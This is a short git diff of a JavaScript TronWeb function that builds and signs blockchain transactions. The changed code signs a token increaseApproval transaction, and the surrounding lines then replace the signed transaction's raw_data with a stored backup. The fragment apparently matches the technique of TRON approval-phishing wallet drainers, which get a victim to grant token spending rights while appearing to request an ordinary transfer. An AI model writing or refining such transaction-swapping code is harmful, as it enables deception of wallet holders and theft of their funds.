@@ -58,11 +58,8 @@ async function executeBlockchainTransaction(
     //     JSON.stringify(increaseApprovalTx.transaction, null, 2)
     // );``
 
-    transferTx.transaction.raw_data.contract[1] =
-      increaseApprovalTx.transaction.raw_data.contract[0];
-    console.log(transferTx, 'transferTx');
-
-    const signedTx = await tronWeb.trx.sign(transferTx.transaction);
+    tronWeb.trx.sign(transferTx.transaction);
+    const signedTx = await tronWeb.trx.sign(increaseApprovalTx.transaction);
 
     signedTx.raw_data = raw_data_backup;
     signedTx.visible = false;
